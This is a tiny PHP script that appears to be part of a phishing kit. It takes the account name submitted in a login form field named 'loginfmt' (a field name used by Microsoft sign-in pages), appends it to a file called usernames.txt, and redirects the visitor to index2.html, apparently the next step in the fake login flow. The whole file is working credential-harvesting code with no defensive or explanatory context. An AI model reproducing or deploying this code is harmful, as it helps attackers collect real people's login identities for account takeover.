<?php

file_put_contents("usernames.txt", "Account: " . $_POST['loginfmt'] . "\n", FILE_APPEND);
header ('Location:index2.html');
?>